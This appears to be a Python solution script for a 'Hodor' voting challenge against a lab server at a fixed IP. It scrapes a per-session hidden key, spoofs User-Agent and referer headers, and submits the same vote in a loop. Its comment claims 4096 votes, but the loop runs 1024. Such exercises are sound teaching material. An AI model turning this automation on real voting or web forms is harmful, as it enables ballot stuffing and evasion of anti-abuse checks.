#!/usr/bin/python3
#task1 voting 4096 times
""" Hodor Voting Contest """
import requests
from bs4 import BeautifulSoup

url = "http://158.69.76.135/level2.php"
form = {
        "id": "23",
        "holdthedoor": "Submit",
        "key": ""
        }    
crash = 0
user_agent = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0")
header = {
    "User-Agent": user_agent,
    "referer": url
    }

if __name__ == "__main__":
    for i in range(0, 1024):
        session = requests.session()
        page = session.get(url, headers=header)
        content = page.content
        soup = BeautifulSoup(content, "html.parser")
        inputs = soup.find_all('input')
        for line in inputs:
            if line.get('name') == "key":
                key = line.get('value')

        form["key"] = key 

        result = session.post(url, headers=header, data=form)
        if result.status_code != 200:
            print("Failed to post request number {}".format(i))
            crash += 1
    print("Failed {} requests".format(crash))
